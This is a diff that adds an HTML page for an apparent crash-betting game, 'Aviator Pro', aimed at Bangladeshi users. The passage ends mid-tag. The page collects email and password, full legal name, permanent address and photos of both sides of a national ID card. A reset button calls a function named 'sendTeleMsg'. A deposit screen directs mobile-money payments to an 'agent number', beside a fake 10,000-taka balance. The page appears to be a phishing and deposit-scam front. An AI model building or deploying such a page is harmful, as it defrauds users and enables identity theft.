@@ -1,1 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Ultimate Pro | Official</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body { background: #000; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        input, textarea, select { background: #111 !important; border: 1px solid #333 !important; color: white !important; padding: 14px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 12px; font-size: 14px; }
+        .btn-main { background: #e74c3c; padding: 15px; border-radius: 15px; width: 100%; font-weight: 900; transition: 0.3s; box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3); }
+        .btn-main:active { transform: scale(0.95); }
+        .hidden { display: none; }
+        .crash-screen { height: 260px; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); border-radius: 24px; position: relative; overflow: hidden; border: 1px solid #222; }
+        #plane-container { position: absolute; bottom: 20px; left: 20px; width: 55px; z-index: 10; transition: 0.1s linear; }
+        .multiplier-text { font-size: 4rem; font-weight: 900; z-index: 20; text-shadow: 0 0 30px rgba(255, 0, 0, 0.4); }
+        .nav-btn { flex: 1; text-align: center; padding: 10px; font-size: 11px; color: #777; cursor: pointer; }
+        .nav-active { color: #e74c3c; font-weight: bold; }
+        .step-dot { height: 6px; width: 30px; background: #333; border-radius: 10px; }
+        .step-active { background: #e74c3c; }
+    </style>
+</head>
+<body class="pb-20">
 
+<div id="auth-section" class="max-w-md mx-auto p-6 mt-10">
+    <div class="text-center mb-8">
+        <h1 class="text-4xl font-black italic text-red-600">AVIATOR PRO</h1>
+        <p class="text-gray-500 text-[10px] tracking-widest uppercase">Safe & Secure Gaming</p>
+    </div>
+
+    <div id="login-ui">
+        <input type="email" id="log-email" placeholder="Email Address">
+        <input type="password" id="log-pass" placeholder="Password">
+        <button onclick="handleLogin()" class="btn-main mb-6">LOG IN</button>
+        <div class="flex justify-between text-xs text-gray-400">
+            <span onclick="toggleAuth('signup')" class="text-red-500 cursor-pointer font-bold underline">Create Account</span>
+            <span onclick="toggleAuth('reset')" class="cursor-pointer italic">Forgot Password?</span>
+        </div>
+    </div>
+
+    <div id="signup-ui" class="hidden">
+        <div class="flex gap-2 justify-center mb-6">
+            <div id="dot-1" class="step-dot step-active"></div>
+            <div id="dot-2" class="step-dot"></div>
+        </div>
+        <div id="step-1">
+            <h3 class="text-lg font-bold mb-4 text-center text-red-500 uppercase">Step 1: Info</h3>
+            <input type="text" id="reg-name" placeholder="Full Name (NID Name)">
+            <input type="email" id="reg-email" placeholder="Email Address">
+            <input type="password" id="reg-pass" placeholder="Create Password">
+            <button onclick="nextStep(2)" class="btn-main !bg-zinc-800 uppercase">Next Step</button>
+        </div>
+        <div id="step-2" class="hidden">
+            <h3 class="text-lg font-bold mb-4 text-center text-red-500 uppercase">Step 2: Verification</h3>
+            <textarea id="reg-address" rows="2" placeholder="Permanent Address (Required)"></textarea>
+            <div class="grid grid-cols-2 gap-3 mb-4">
+                <div class="bg-[#111] p-3 rounded-xl border border-[#333]">
+                    <p class="text-[8px] text-gray-500 mb-2 uppercase">NID Front (Req)</p>
+                    <input type="file" class="text-[9px] !mb-0 !p-0 border-none bg-transparent">
+                </div>
+                <div class="bg-[#111] p-3 rounded-xl border border-[#333]">
+                    <p class="text-[8px] text-gray-500 mb-2 uppercase">NID Back (Req)</p>
+                    <input type="file" class="text-[9px] !mb-0 !p-0 border-none bg-transparent">
+                </div>
+            </div>
+            <button onclick="handleSignupSubmit()" class="btn-main !bg-green-600 uppercase">Submit Account</button>
+            <button onclick="nextStep(1)" class="w-full mt-4 text-gray-500 text-xs font-bold uppercase">Back</button>
+        </div>
+    </div>
+
+    <div id="reset-ui" class="hidden text-center">
+        <h3 class="text-lg font-bold mb-4 uppercase text-yellow-500 italic">Reset Link</h3>
+        <input type="email" id="res-email" placeholder="Registered Email">
+        <button onclick="sendTeleMsg('Reset')" class="btn-main !bg-zinc-800">REQUEST RESET</button>
+        <p onclick="toggleAuth('login')" class="text-center text-xs text-red-500 mt-6 cursor-pointer">Back to Login</p>
+    </div>
+</div>
+
+<div id="main-interface" class="max-w-md mx-auto hidden">
+    <div class="p-4 flex justify-between items-center bg-[#111] border-b border-[#222]">
+        <div>
+            <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Balance</p>
+            <p class="text-2xl font-black text-yellow-500">৳ <span id="user-balance">10,000.00</span></p>
+        </div>
+        <button onclick="showPage('wallet')" class="bg-red-600 px-5 py-2 rounded-xl text-xs font-bold shadow-lg shadow-red-900/40">DEPOSIT</button>
+    </div>
+
+    <div id="game-page" class="p-2">
+        <div class="crash-screen flex items-center justify-center mb-4">
+            <div id="multiplier" class="multiplier-text">1.00x</div>
+            <div id="plane-container">
+                <svg viewBox="0 0 100 100" fill="#e74c3c" width="55"><path d="M10,50 L90,50 L70,30 L30,30 Z"/><rect x="40" y="50" width="20" height="25" fill="#c0392b"/></svg>
+            </div>
+        </div>
+        <div class="grid grid-cols-2 gap-2">
+            <div class="bg-zinc-900 p-4 rounded-3xl border border-zinc-800 text-center">
+                <input type="number" value="10" class="text-center !p-2 !mb-2 !bg-black">
+                <button class="w-full bg-green-600 py-3 rounded-xl font-black uppercase text-sm">Bet</button>
+            </div>
+            <div class="bg-zinc-900 p-4 rounded-3xl border border-zinc-800 text-center">
+                <input type="number" value="100" class="text-center !p-2 !mb-2 !bg-black">
+                <button class="w-full bg-green-600 py-3 rounded-xl font-black uppercase text-sm">Bet</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="wallet-page" class="hidden p-4">
+        <div class="bg-zinc-900 rounded-3xl border border-zinc-800 overflow-hidden shadow-2xl mb-6">
+            <div class="bg-gradient-to-r from-red-800 to-red-600 p-4 text-center">
+                <h3 class="font-black text-white uppercase italic">Official Cashier</h3>
+            </div>
+            <div class="p-5">
+                <div class="bg-black/50 border-2 border-dashed border-red-600/50 p-4 rounded-2xl mb-4 text-center">
+                    <span class="text-[8px] px-2 py-0.5 rounded-full font-bold bg-red-600">AGENT NUMBER</span>
+                    <h2 class="text-xl font-black text-white mt-1">017XXXXXXXX</h2>
+                    <p class="text-[9px] text-yellow-500 mt-1 font-bold italic">CASH OUT ONLY</p>
+                </div>
+                <div class="flex justify-between gap-2 mb-4">
+                    <div class="flex-1 bg-white p-2 rounded-xl border-2 border-pink-500 flex flex-col items-center">
+                        <img src="https://raw.githubusercontent.com/Hajira-Begum/logo/main/bkash.png" class="h-6">
+                        <span class="text-[7px] text-pink-600 font-bold mt-1 uppercase">bKash</span>
+                    </div>
+                    <div class="flex-1 bg-white p-2 rounded-xl border-2 border-orange-500 flex flex-col items-center">
+                        <img src="https://raw.githubusercontent.com/Hajira-Begum/logo/main/nagad.png" class=
